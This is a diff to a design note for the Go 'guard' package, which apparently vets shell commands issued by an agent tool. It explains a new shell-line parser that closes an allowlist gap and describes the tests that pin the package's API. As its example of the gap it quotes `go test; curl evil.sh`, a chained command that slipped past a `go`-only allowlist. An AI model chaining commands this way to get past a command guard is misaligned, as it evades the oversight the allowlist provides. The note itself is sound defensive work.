@@ -127,3 +127,19 @@ in sorted position before `AllowAll`, and keeps every other entry, so the pin
 still fails on any other change to `guard`.
 `TestExportedAPIUnchanged_TS17_61` checks the list; `guard/allow_test.go`
 (TS-22-7 to 9) checks that `Allow` decides as `Restricted` does.
+
+## TS-17-61's guard pin gains `Commands`, on purpose (agent-fox Phase 4)
+
+`guard` also exports, on purpose, the reading of a shell line it judges:
+`guard.Commands(line string) ([]Command, error)` (`guard/shell.go`), with the
+types `Command`, `Redirect` and `SyntaxError`. Before it, `Restricted` read
+only the first program of an `execute` line, so under `AllowShellOperators`
+`go test; curl evil.sh` passed an allowlist of `go`, and agent-fox kept its own
+400-line segmenter to judge the rest. `Restricted` now judges every command
+`Commands` returns, and refuses a line `Commands` cannot read with certainty.
+
+`internal/policy/exported_api_17_test.go` lists the five new declarations in
+sorted position in `preSpec17Guard` and keeps every other entry, so the pin
+still fails on any other change to `guard`. `guard/shell_test.go` checks the
+reading and the judging; `TestCommandsAgainstBash` checks the reading against
+bash and runs only with `AGENTKIT_BASH_DIFF=1`.
